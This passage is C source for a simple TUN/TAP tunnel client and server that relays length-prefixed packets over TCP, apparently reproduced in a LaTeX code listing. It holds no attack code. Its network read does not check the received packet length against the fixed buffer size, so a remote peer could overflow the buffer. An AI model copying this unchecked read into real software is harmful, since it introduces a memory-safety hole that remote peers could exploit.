int tun_alloc(char *dev, int flags) {

  struct ifreq ifr;
  int fd, err;

  if( (fd = open("/dev/net/tun", O_RDWR)) < 0 ) {
    perror("Opening /dev/net/tun");
    return fd;
  }

  memset(&ifr, 0, sizeof(ifr));

  ifr.ifr_flags = flags;

  if (*dev) {
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
  }

  if( (err = ioctl(fd, TUNSETIFF, (void *)&ifr)) < 0 ) {
    perror("ioctl(TUNSETIFF)");
    close(fd);
    return err;
  }

  strcpy(dev, ifr.ifr_name);

  return fd;
}

/**************************************************************************
 * cread: read routine that checks for errors and exits if an error is    *
 *        returned.                                                       *
 **************************************************************************/
int cread(int fd, char *buf, int n){
  
  int nread;

  if((nread=read(fd, buf, n))<0){
    perror("Reading data");
    exit(1);
  }
  return nread;
}

/**************************************************************************
 * cwrite: write routine that checks for errors and exits if an error is  *
 *         returned.                                                      *
 **************************************************************************/
int cwrite(int fd, char *buf, int n){
  
  int nwrite;

  if((nwrite=write(fd, buf, n))<0){
    perror("Writing data");
    exit(1);
  }
  return nwrite;
}

/**************************************************************************
 * read_n: ensures we read exactly n bytes, and puts those into "buf".    *
 *         (unless EOF, of course)                                        *
 **************************************************************************/
int read_n(int fd, char *buf, int n) {

  int nread, left = n;

  while(left > 0) {
    if ((nread = cread(fd, buf, left))==0){
      return 0 ;      
    }else {
      left -= nread;
      buf += nread;
    }
  }
  return n;  
}

/**************************************************************************
 * do_debug: prints debugging stuff (doh!)                                *
 **************************************************************************/
void do_debug(char *msg, ...){
  
  va_list argp;
  
  if(debug){
	va_start(argp, msg);
	vfprintf(stderr, msg, argp);
	va_end(argp);
  }
}

/**************************************************************************
 * my_err: prints custom error messages on stderr.                        *
 **************************************************************************/
void my_err(char *msg, ...) {

  va_list argp;
  
  va_start(argp, msg);
  vfprintf(stderr, msg, argp);
  va_end(argp);
}

/**************************************************************************
 * usage: prints usage and exits.                                         *
 **************************************************************************/
void usage(void) {
  fprintf(stderr, "Usage:\n");
  fprintf(stderr, "%s -i <ifacename> [-s|-c <serverIP>] [-p <port>] [-u|-a] [-d]\n", progname);
  fprintf(stderr, "%s -h\n", progname);
  fprintf(stderr, "\n");
  fprintf(stderr, "-i <ifacename>: Name of interface to use (mandatory)\n");
  fprintf(stderr, "-s|-c <serverIP>: run in server mode (-s), or specify server address (-c <serverIP>) (mandatory)\n");
  fprintf(stderr, "-p <port>: port to listen on (if run in server mode) or to connect to (in client mode), default 55555\n");
  fprintf(stderr, "-u|-a: use TUN (-u, default) or TAP (-a)\n");
  fprintf(stderr, "-d: outputs debug information while running\n");
  fprintf(stderr, "-h: prints this help text\n");
  exit(1);
}

int main(int argc, char *argv[]) {
  
  int tap_fd, option;
  int flags = IFF_TUN;
  char if_name[IFNAMSIZ] = "";
  int header_len = IP_HDR_LEN;
  int maxfd;
  uint16_t nread, nwrite, plength;
//  uint16_t total_len, ethertype;
  char buffer[BUFSIZE];
  struct sockaddr_in local, remote;
  char remote_ip[16] = "";
  unsigned short int port = PORT;
  int sock_fd, net_fd, optval = 1;
  socklen_t remotelen;
  int cliserv = -1;    /* must be specified on cmd line */
  unsigned long int tap2net = 0, net2tap = 0;

  progname = argv[0];
  
  /* Check command line options */
  while((option = getopt(argc, argv, "i:sc:p:uahd")) > 0){
    switch(option) {
      case 'd':
        debug = 1;
        break;
      case 'h':
        usage();
        break;
      case 'i':
        strncpy(if_name,optarg,IFNAMSIZ-1);
        break;
      case 's':
        cliserv = SERVER;
        break;
      case 'c':
        cliserv = CLIENT;
        strncpy(remote_ip,optarg,15);
        break;
      case 'p':
        port = atoi(optarg);
        break;
      case 'u':
        flags = IFF_TUN;
        break;
      case 'a':
        flags = IFF_TAP;
        header_len = ETH_HDR_LEN;
        break;
      default:
        my_err("Unknown option %c\n", option);
        usage();
    }
  }

  argv += optind;
  argc -= optind;

  if(argc > 0){
    my_err("Too many options!\n");
    usage();
  }

  if(*if_name == '\0'){
    my_err("Must specify interface name!\n");
    usage();
  }else if(cliserv < 0){
    my_err("Must specify client or server mode!\n");
    usage();
  }else if((cliserv == CLIENT)&&(*remote_ip == '\0')){
    my_err("Must specify server address!\n");
    usage();
  }

  /* initialize tun/tap interface */
  if ( (tap_fd = tun_alloc(if_name, flags | IFF_NO_PI)) < 0 ) {
    my_err("Error connecting to tun/tap interface %s!\n", if_name);
    exit(1);
  }

  do_debug("Successfully connected to interface %s\n", if_name);

  if ( (sock_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    perror("socket()");
    exit(1);
  }

  if(cliserv==CLIENT){
    /* Client, try to connect to server */

    /* assign the destination address */
    memset(&remote, 0, sizeof(remote));
    remote.sin_family = AF_INET;
    remote.sin_addr.s_addr = inet_addr(remote_ip);
    remote.sin_port = htons(port);

    /* connection request */
    if (connect(sock_fd, (struct sockaddr*) &remote, sizeof(remote)) < 0){
      perror("connect()");
      exit(1);
    }

    net_fd = sock_fd;
    do_debug("CLIENT: Connected to server %s\n", inet_ntoa(remote.sin_addr));
    
  } else {
    /* Server, wait for connections */

    /* avoid EADDRINUSE error on bind() */
    if(setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, (char *)&optval, sizeof(optval)) < 0){
      perror("setsockopt()");
      exit(1);
    }
    
    memset(&local, 0, sizeof(local));
    local.sin_family = AF_INET;
    local.sin_addr.s_addr = htonl(INADDR_ANY);
    local.sin_port = htons(port);
    if (bind(sock_fd, (struct sockaddr*) &local, sizeof(local)) < 0){
      perror("bind()");
      exit(1);
    }
    
    if (listen(sock_fd, 5) < 0){
      perror("listen()");
      exit(1);
    }
    
    /* wait for connection request */
    remotelen = sizeof(remote);
    memset(&remote, 0, remotelen);
    if ((net_fd = accept(sock_fd, (struct sockaddr*)&remote, &remotelen)) < 0){
      perror("accept()");
      exit(1);
    }

    do_debug("SERVER: Client connected from %s\n", inet_ntoa(remote.sin_addr));
  }
  
  /* use select() to handle two descriptors at once */
  maxfd = (tap_fd > net_fd)?tap_fd:net_fd;

  while(1) {
    int ret;
    fd_set rd_set;

    FD_ZERO(&rd_set);
    FD_SET(tap_fd, &rd_set); FD_SET(net_fd, &rd_set);

    ret = select(maxfd + 1, &rd_set, NULL, NULL, NULL);

    if (ret < 0 && errno == EINTR){
      continue;
    }

    if (ret < 0) {
      perror("select()");
      exit(1);
    }

    if(FD_ISSET(tap_fd, &rd_set)){
      /* data from tun/tap: just read it and write it to the network */
      
      nread = cread(tap_fd, buffer, BUFSIZE);

      tap2net++;
      do_debug("TAP2NET %lu: Read %d bytes from the tap interface\n", tap2net, nread);

      /* write length + packet */
      plength = htons(nread);
      nwrite = cwrite(net_fd, (char *)&plength, sizeof(plength));
      nwrite = cwrite(net_fd, buffer, nread);
      
      do_debug("TAP2NET %lu: Written %d bytes to the network\n", tap2net, nwrite);
    }

    if(FD_ISSET(net_fd, &rd_set)){
      /* data from the network: read it, and write it to the tun/tap interface. 
       * We need to read the length first, and then the packet */

      /* Read length */      
      nread = read_n(net_fd, (char *)&plength, sizeof(plength));
      if(nread == 0) {
        /* ctrl-c at the other end */
        break;
      }

      net2tap++;

      /* read packet */
      nread = read_n(net_fd, buffer, ntohs(plength));
      do_debug("NET2TAP %lu: Read %d bytes from the network\n", net2tap, nread);

      /* now buffer[] contains a full packet or frame, write it into the tun/tap interface */ 
      nwrite = cwrite(tap_fd, buffer, nread);
      do_debug("NET2TAP %lu: Written %d bytes to the tap interface\n", net2tap, nwrite);
    }
  }
  
  return(0);
}
	\end{minted}
	\restoregeometry
\end{document}

